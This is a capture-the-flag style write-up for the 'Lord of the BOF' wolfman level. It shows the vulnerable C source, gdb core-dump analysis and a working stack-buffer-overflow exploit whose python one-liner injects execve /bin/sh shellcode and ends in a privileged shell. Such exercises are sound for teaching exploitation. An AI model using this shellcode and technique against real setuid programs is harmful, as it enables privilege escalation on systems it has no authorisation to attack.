# Level5

## This level's goal
- LEVEL5 (orc -> wolfman) : egghunter + bufferhunter

***

```
[orc@localhost orc]$ bash2

[orc@localhost orc]$ ls -l
total 20
-rwsr-sr-x    1 wolfman  wolfman     12587 Feb 26  2010 wolfman
-rw-r--r--    1 root     root          581 Mar 29  2010 wolfman.c

[orc@localhost orc]$ cat wolfman.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

In the code, the egghunter likes as level4.

Also, there is a buffer hunter that buffer will be reset in the bottem line, but there is no limit in the input values.

So, I will input the shell code in the return address.

The payload will be dummy(44bytes) + RET(4bytes) + Shell code.

```
[orc@localhost orc]$ ulimit -s unlimited
[orc@localhost orc]$ gcc wolfman.c -o wolfman2
[orc@localhost orc]$ ./wolfman2 `python -c 'print "A"*44+"\xff\xff\xff\xbf"+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿÿ¿1ÀPh//shh/bin‰ãPS‰á‰Â°
                                                                      Í€
Segmentation fault (core dumped)
[orc@localhost orc]$ gdb -q -c core
Core was generated by `./wolfman2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿÿ¿'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfffffff in ?? ()
(gdb) x/200x $esp
0xbffffc20:     0x772f2e00      0x6d666c6f      0x00326e61      0x41414141
0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc50:     0x41414141      0x41414141      0xbfffffff      0x90909090
0xbffffc60:     0x90909090      0x90909090      0x90909090      0x90909090

[orc@localhost orc]$ ./wolfman `python -c 'print "A"*44+"\x60\xfc\xff\xbf"+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`üÿ¿1ÀPh//shh/bin‰ãPS‰á‰Â°
                                                                      Í€
bash$ my-pass
euid = 505
love eyuna
```